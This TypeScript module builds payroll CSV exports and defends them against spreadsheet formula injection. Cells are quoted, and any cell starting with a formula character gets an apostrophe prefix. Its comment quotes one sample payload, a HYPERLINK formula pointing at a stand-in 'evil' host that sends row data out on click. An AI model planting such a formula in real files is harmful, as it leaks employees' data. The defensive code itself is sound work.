/**
 * CSV serialization for the payroll and labour-cost exports.
 *
 * Two separate jobs, and it is easy to think the first one covers the second:
 *
 * 1. **Quoting** — every cell is wrapped in double quotes with inner quotes
 *    doubled, per RFC 4180, so commas, quotes and newlines in a name or note
 *    cannot break the column structure.
 *
 * 2. **Formula neutralization** — quoting does NOT stop a spreadsheet executing
 *    a cell. Excel, Sheets and LibreOffice all treat a leading `=`, `+`, `-`,
 *    `@`, tab or carriage return as the start of a formula, quoted or not. These
 *    exports carry text that other people wrote: an employee's clock-in note and
 *    their own name both land in a file their manager opens. A note of
 *    `=HYPERLINK("http://evil/?"&A1,"payroll")` is a live link to exfiltrate the
 *    row on click, and the DDE variants can prompt to launch a process.
 *
 *    So a cell starting with one of those characters gets a single leading
 *    apostrophe — the standard "treat this as text" marker, which spreadsheets
 *    consume on display, and which plain CSV parsers (payroll importers) see as
 *    one leading quote character rather than a mangled value.
 *
 * Anything writing a CSV in this codebase must go through {@link toCsv} — both
 * exports previously carried their own copy of the quoting helper, which is how
 * one fix would have missed the other.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIX = /^[=+\-@\t\r]/

/**
 * A plain number. Exempt from neutralization because `-` is both a formula
 * character and a minus sign: prefixing a negative figure would turn it into
 * text and break the numeric columns a payroll importer reads.
 */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/

/**
 * Serialize one value as a CSV cell: formula-neutralized, then RFC 4180 quoted.
 *
 * `null` and `undefined` become an empty cell rather than the strings "null" or
 * "undefined" — an empty note should look empty in payroll.
 */
export function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value)
  const needsGuard = FORMULA_PREFIX.test(raw) && !PLAIN_NUMBER.test(raw)
  const safe = needsGuard ? `'${raw}` : raw
  return `"${safe.replace(/"/g, '""')}"`
}

/** Serialize a grid of values to a CSV body (no trailing newline). */
export function toCsv(rows: readonly unknown[][]): string {
  return rows.map((row) => row.map(csvCell).join(",")).join("\n")
}
